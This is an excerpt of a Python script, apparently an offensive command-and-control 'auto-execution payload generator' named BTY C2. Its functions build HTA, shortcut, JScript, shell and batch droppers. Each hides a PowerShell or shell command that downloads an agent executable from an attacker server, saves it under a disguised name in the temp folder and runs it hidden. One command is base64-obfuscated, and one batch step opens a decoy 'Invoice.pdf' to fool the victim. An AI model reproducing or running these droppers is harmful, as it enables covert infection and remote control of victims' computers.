#!/usr/bin/env python3
"""
BTY C2 — Auto-Execution Payload Generator
...
def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║    BTY C2 — Auto-Execution Payload Gen       ║
   ╚══════════════════════════════════════════════╝
{RESET}""")
...
def generate_hta(server, name=None):
    ...
    ps_cmd = f"""powershell -w hidden -c "$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/bty-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{server}'"
"""
...
def generate_lnk(server, name=None, icon="pdf"):
    ...
    ps_cmd = f'powershell -w hidden -c "Invoke-WebRequest -Uri http://{host}:8000/bty-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
...
def generate_js(server, name=None):
    ...
    js = f"""// BTY Auto-Execution JScript
...
"""
    ...
    ps_cmd = f'powershell -w hidden -c "iwr http://{host}:8000/bty-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
    b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
...
# Auto-setup script
nohup $(dirname "$0")/bty-agent --server {server} &>/dev/null &
""")
...
start /b bty-agent.exe --server {server}
start "" "Invoice.pdf"
""")
...
def main():
    ...
    parser = argparse.ArgumentParser(description="BTY Auto-Execution Payload Generator")
